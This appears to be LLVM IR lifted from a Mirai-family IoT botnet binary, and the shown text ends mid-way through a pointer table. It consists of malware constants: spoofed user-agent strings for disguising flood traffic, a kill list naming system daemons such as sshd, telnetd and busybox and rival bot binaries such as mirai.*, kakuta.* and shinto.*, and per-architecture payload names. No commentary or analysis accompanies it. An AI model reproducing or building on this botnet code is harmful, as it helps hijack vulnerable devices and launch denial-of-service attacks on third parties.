@global_var_1001552c.360 = constant [121 x i8] c"Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910R4 USCC Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBr\00"
@global_var_100155a8.361 = constant [121 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2\00"
@global_var_10015624.362 = constant [121 x i8] c"Mozilla/5.0 (Linux; Android 5.1.1; SM-G925T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mob\00"
@global_var_100156a0.363 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0\00"
@global_var_100156e4.364 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_10015728.365 = constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 8743.85.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.101 Safari/537.36\00"
@global_var_1001579c.366 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10015810.367 = constant [117 x i8] c"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393\00"
@global_var_10015888.368 = constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36\00"
@global_var_100158fc.369 = constant [79 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0\00"
@global_var_1001594c.370 = constant [121 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36\00"
@global_var_100159c8.371 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36\00"
@global_var_10015a3c.372 = constant [121 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.1.2883.83 Secure/55.1.2883.373 Saf\00"
@global_var_10015ab8.373 = constant [137 x i8] c"Mozilla/5.0 (Linux; Android 5.1.1; LGLS665 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36\00"
@global_var_10015b44.374 = constant [73 x i8] c"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\00"
@global_var_10015b90.375 = constant [267 x i8] c"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG-SM-N910A Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 Instagram 10.5.1 Android (22/5.1.1; 640dpi; 1440x2560; samsung; SAMSUNG-SM-N910A; trlteatt; qcom; en_US)\00"
@global_var_10015c9c.376 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_10015cdc.377 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_10015d1c.378 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_10015dac.379 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_10015de4.380 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_10015e04.381 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_10015e1c.382 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_10015e74.383 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_10015f14.384 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_10015f68.385 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_10015fdc.386 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_1001601c.387 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_100160d4.388 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_10016128.389 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_10016180.390 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_100161d8.391 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_10016218.392 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_10016260.393 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_100162b8.394 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_10016324.395 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_1001637c.396 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_100163cc.397 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_100163f0.398 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_1001644c.399 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_1001645c.400 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_1001648c.401 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_100164b0.402 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_100164d4.403 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_100164f0.404 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_10016530.405 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_100165bc.406 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10016604.407 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1001664c.408 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10016694.409 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_100166dc.410 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_10016730.411 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_10016780.412 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_100167ec.413 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_10016840.414 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_1001689c.415 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_100168f8.416 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_1001695c.417 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_100169b8.418 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_10016a14.419 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_10016a70.420 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_10016ad0.421 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_10016b18.422 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_10016bb0.423 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_10016bfc.424 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_10016c48.425 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_10016c98.426 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_10016ce0.427 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_10016d34.428 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_10016d84.429 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_10016dcc.430 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_10016e18.431 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_10016e64.432 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_10016eac.433 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_10016efc.434 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_10016f4c.435 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_10016f80.436 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_10016fb4.437 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_10016ffc.438 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_10017008.439 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_10017014.440 = constant [6 x i8] c"jhUOH\00"
@global_var_1001701c.441 = constant [8 x i8] c"RYrydry\00"
@global_var_10017024.442 = constant [9 x i8] c"UYyuyioy\00"
@global_var_10017030.443 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_1001703c.444 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_10017048.445 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_10017054.446 = constant [8 x i8] c"FDFDHFC\00"
@global_var_1001705c.447 = constant [9 x i8] c"FTUdftui\00"
@global_var_10017068.448 = constant [4 x i8] c"[M]\00"
@global_var_1001706c.449 = constant [5 x i8] c"[MS]\00"
@global_var_10017074.450 = constant [5 x i8] c"[SH]\00"
@global_var_1001707c.451 = constant [6 x i8] c"[x86]\00"
@global_var_10017084.452 = constant [5 x i8] c"[A6]\00"
@global_var_1001708c.453 = constant [5 x i8] c"[I6]\00"
@global_var_10017094.454 = constant [6 x i8] c"[PPC]\00"
@global_var_1001709c.455 = constant [5 x i8] c"[I5]\00"
@global_var_100170a4.456 = constant [6 x i8] c"[M68]\00"
@global_var_100170ac.457 = constant [4 x i8] c"[S]\00"
@global_var_100170b0.458 = constant [5 x i8] c"[A4]\00"
@global_var_100170b8.459 = constant [5 x i8] c"[A5]\00"
@global_var_100170c0.460 = constant [10 x i8] c"[PPC-440]\00"
@global_var_100170cc.461 = constant [8 x i8] c"[A4-EB]\00"
@global_var_100170d4.462 = constant [8 x i8] c"[A4-TL]\00"
@global_var_100170dc.463 = constant [5 x i8] c"[I4]\00"
@global_var_100170e4.464 = constant [6 x i8] c"[M64]\00"
@global_var_100170ec.465 = constant [5 x i8] c"ntpd\00"
@global_var_100170f4.466 = constant [5 x i8] c"sshd\00"
@global_var_100170fc.467 = constant [8 x i8] c"openssh\00"
@global_var_10017104.468 = constant [5 x i8] c"bash\00"
@global_var_1001710c.469 = constant [5 x i8] c"tftp\00"
@global_var_10017114.470 = constant [5 x i8] c"wget\00"
@global_var_1001711c.471 = constant [5 x i8] c"cron\00"
@global_var_10017124.472 = constant [4 x i8] c"ftp\00"
@global_var_10017128.473 = constant [5 x i8] c"pftp\00"
@global_var_10017134.474 = constant [6 x i8] c"[cpu]\00"
@global_var_1001713c.475 = constant [8 x i8] c"apache2\00"
@global_var_10017144.476 = constant [8 x i8] c"telnetd\00"
@global_var_1001714c.477 = constant [5 x i8] c"mips\00"
@global_var_10017154.478 = constant [7 x i8] c"mipsel\00"
@global_var_1001715c.479 = constant [4 x i8] c"sh4\00"
@global_var_10017160.480 = constant [4 x i8] c"x86\00"
@global_var_10017164.481 = constant [5 x i8] c"i686\00"
@global_var_1001716c.482 = constant [5 x i8] c"i586\00"
@global_var_10017174.483 = constant [4 x i8] c"ppc\00"
@global_var_10017178.484 = constant [5 x i8] c"m68k\00"
@global_var_10017180.485 = constant [11 x i8] c"jackmymips\00"
@global_var_1001718c.486 = constant [13 x i8] c"jackmymips64\00"
@global_var_1001719c.487 = constant [13 x i8] c"jackmymipsel\00"
@global_var_100171ac.488 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_100171b8.489 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_100171c8.490 = constant [10 x i8] c"jackmysh4\00"
@global_var_100171d4.491 = constant [10 x i8] c"jackmyx86\00"
@global_var_100171e0.492 = constant [11 x i8] c"jackmyi486\00"
@global_var_100171ec.493 = constant [11 x i8] c"jackmyi586\00"
@global_var_100171f8.494 = constant [11 x i8] c"jackmyi686\00"
@global_var_10017204.495 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_10017214.496 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_10017228.497 = constant [11 x i8] c"jackmym68k\00"
@global_var_10017234.498 = constant [12 x i8] c"jackmysparc\00"
@global_var_10017240.499 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_1001724c.500 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_1001725c.501 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_10017268.502 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_10017274.503 = constant [7 x i8] c"x86_64\00"
@global_var_1001727c.504 = constant [7 x i8] c"armv6l\00"
@global_var_10017284.505 = constant [8 x i8] c"powerpc\00"
@global_var_1001728c.506 = constant [6 x i8] c"sparc\00"
@global_var_10017294.507 = constant [7 x i8] c"armv4l\00"
@global_var_1001729c.508 = constant [7 x i8] c"armv5l\00"
@global_var_100172a4.509 = constant [14 x i8] c"powerpc-440fp\00"
@global_var_100172b4.510 = constant [8 x i8] c"botmips\00"
@global_var_100172bc.511 = constant [10 x i8] c"botmipsel\00"
@global_var_100172c8.512 = constant [7 x i8] c"botsh4\00"
@global_var_100172d0.513 = constant [10 x i8] c"botx86_64\00"
@global_var_100172dc.514 = constant [10 x i8] c"botarmv6l\00"
@global_var_100172e8.515 = constant [8 x i8] c"boti686\00"
@global_var_100172f0.516 = constant [11 x i8] c"botpowerpc\00"
@global_var_100172fc.517 = constant [8 x i8] c"boti586\00"
@global_var_10017304.518 = constant [8 x i8] c"botm68k\00"
@global_var_1001730c.519 = constant [9 x i8] c"botsparc\00"
@global_var_10017318.520 = constant [10 x i8] c"botarmv4l\00"
@global_var_10017324.521 = constant [10 x i8] c"botarmv5l\00"
@global_var_10017330.522 = constant [16 x i8] c"botpowerpc440fp\00"
@global_var_10017340.523 = constant [9 x i8] c"iluvmips\00"
@global_var_1001734c.524 = constant [11 x i8] c"dannytyzoh\00"
@global_var_10017358.525 = constant [10 x i8] c"igisamzin\00"
@global_var_10017364.526 = constant [15 x i8] c"Ihaveablackpup\00"
@global_var_10017374.527 = constant [10 x i8] c"Armv4lkek\00"
@global_var_10017380.528 = constant [10 x i8] c"Armv5lkek\00"
@global_var_1001738c.529 = constant [10 x i8] c"Armv6lkek\00"
@global_var_10017398.530 = constant [8 x i8] c"i686kek\00"
@global_var_100173a0.531 = constant [7 x i8] c"ppckek\00"
@global_var_100173a8.532 = constant [11 x i8] c"motorcycle\00"
@global_var_100173b4.533 = constant [7 x i8] c"m68kek\00"
@global_var_100173bc.534 = constant [9 x i8] c"sparckek\00"
@global_var_100173c8.535 = constant [11 x i8] c"ponydicks1\00"
@global_var_100173d4.536 = constant [11 x i8] c"ponydicks2\00"
@global_var_100173e0.537 = constant [11 x i8] c"ponydicks3\00"
@global_var_100173ec.538 = constant [11 x i8] c"ponydicks4\00"
@global_var_100173f8.539 = constant [11 x i8] c"ponydicks5\00"
@global_var_10017404.540 = constant [11 x i8] c"ponydicks6\00"
@global_var_10017410.541 = constant [11 x i8] c"ponydicks7\00"
@global_var_1001741c.542 = constant [11 x i8] c"ponydicks8\00"
@global_var_10017428.543 = constant [11 x i8] c"ponydicks9\00"
@global_var_10017434.544 = constant [12 x i8] c"ponydicks10\00"
@global_var_10017440.545 = constant [12 x i8] c"ponydicks11\00"
@global_var_1001744c.546 = constant [12 x i8] c"kakuta.mips\00"
@global_var_10017458.547 = constant [12 x i8] c"kakuta.mpsl\00"
@global_var_10017464.548 = constant [11 x i8] c"kakuta.sh4\00"
@global_var_10017470.549 = constant [11 x i8] c"kakuta.x86\00"
@global_var_1001747c.550 = constant [12 x i8] c"kakuta.arm4\00"
@global_var_10017488.551 = constant [12 x i8] c"kakuta.arm5\00"
@global_var_10017494.552 = constant [12 x i8] c"kakuta.arm6\00"
@global_var_100174a0.553 = constant [12 x i8] c"kakuta.i686\00"
@global_var_100174ac.554 = constant [11 x i8] c"kakuta.ppc\00"
@global_var_100174b8.555 = constant [12 x i8] c"kakuta.i586\00"
@global_var_100174c4.556 = constant [12 x i8] c"kakuta.m68k\00"
@global_var_100174d0.557 = constant [13 x i8] c"kakuta.sparc\00"
@global_var_100174e0.558 = constant [11 x i8] c"shinto.x86\00"
@global_var_100174ec.559 = constant [12 x i8] c"shinto.mips\00"
@global_var_100174f8.560 = constant [12 x i8] c"shinto.mpsl\00"
@global_var_10017504.561 = constant [12 x i8] c"shinto.arm4\00"
@global_var_10017510.562 = constant [12 x i8] c"shinto.arm5\00"
@global_var_1001751c.563 = constant [12 x i8] c"shinto.arm6\00"
@global_var_10017528.564 = constant [12 x i8] c"shinto.arm7\00"
@global_var_10017534.565 = constant [11 x i8] c"shinto.ppc\00"
@global_var_10017540.566 = constant [11 x i8] c"shinto.spc\00"
@global_var_1001754c.567 = constant [12 x i8] c"shinto.m68k\00"
@global_var_10017558.568 = constant [11 x i8] c"shinto.sh4\00"
@global_var_10017564.569 = constant [12 x i8] c"shintoo.x86\00"
@global_var_10017570.570 = constant [13 x i8] c"shintoo.mips\00"
@global_var_10017580.571 = constant [13 x i8] c"shintoo.mpsl\00"
@global_var_10017590.572 = constant [12 x i8] c"shintoo.arm\00"
@global_var_1001759c.573 = constant [13 x i8] c"shintoo.arm5\00"
@global_var_100175ac.574 = constant [13 x i8] c"shintoo.arm6\00"
@global_var_100175bc.575 = constant [13 x i8] c"shintoo.arm7\00"
@global_var_100175cc.576 = constant [12 x i8] c"shintoo.ppc\00"
@global_var_100175d8.577 = constant [24 x i8] c"shintoo.spcshintoo.m68k\00"
@global_var_100175f0.578 = constant [12 x i8] c"shintoo.sh4\00"
@global_var_100175fc.579 = constant [10 x i8] c"mirai.x86\00"
@global_var_10017608.580 = constant [12 x i8] c"miraint.x86\00"
@global_var_10017614.581 = constant [11 x i8] c"mirai.mips\00"
@global_var_10017620.582 = constant [13 x i8] c"miraint.mips\00"
@global_var_10017630.583 = constant [11 x i8] c"mirai.mpsl\00"
@global_var_1001763c.584 = constant [13 x i8] c"miraint.mpsl\00"
@global_var_1001764c.585 = constant [10 x i8] c"mirai.arm\00"
@global_var_10017658.586 = constant [12 x i8] c"miraint.arm\00"
@global_var_10017664.587 = constant [12 x i8] c"mirai.arm5n\00"
@global_var_10017670.588 = constant [14 x i8] c"miraint.arm5n\00"
@global_var_10017680.589 = constant [11 x i8] c"mirai.arm7\00"
@global_var_1001768c.590 = constant [13 x i8] c"miraint.arm7\00"
@global_var_1001769c.591 = constant [10 x i8] c"mirai.ppc\00"
@global_var_100176a8.592 = constant [12 x i8] c"miraint.ppc\00"
@global_var_100176b4.593 = constant [10 x i8] c"mirai.spc\00"
@global_var_100176c0.594 = constant [12 x i8] c"miraint.spc\00"
@global_var_100176cc.595 = constant [11 x i8] c"mirai.m68k\00"
@global_var_100176d8.596 = constant [13 x i8] c"miraint.m68k\00"
@global_var_100176e8.597 = constant [10 x i8] c"mirai.sh4\00"
@global_var_100176f4.598 = constant [12 x i8] c"miraint.sh4\00"
@global_var_10014910.602 = constant [8 x i8] c"busybox\00"
@global_var_1002b2e4.609 = global [162 x i8*] [i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10016ffc.438, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017008.439, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017014.440, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001701c.441, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017024.442, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017030.443, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001703c.444, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017048.445, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017054.446, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001705c.447, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017068.448, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001706c.449, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017074.450, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001707c.451, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017084.452, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001708c.453, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017094.454, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001709c.455, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100170a4.456, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100170ac.457, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100170b0.458, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100170b8.459, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100170c0.460, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100170cc.461, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100170d4.462, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100170dc.463, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100170e4.464, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100170ec.465, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100170f4.466, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100170fc.467, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017104.468, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001710c.469, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017114.470, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001711c.471, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017124.472, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017128.473, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10017130.34, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017134.474, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001713c.475, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017144.476, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001714c.477, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017154.478, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001715c.479, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017160.480, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017164.481, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001716c.482, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017174.483, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017178.484, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017180.485, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001718c.486, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001719c.487, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100171ac.488, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100171b8.489, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100171c8.490, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100171d4.491, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100171e0.492, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100171ec.493, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100171f8.494, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017204.495, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_10017214.496, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017228.497, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017234.498, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017240.499, i32 0, i32 0), i8* 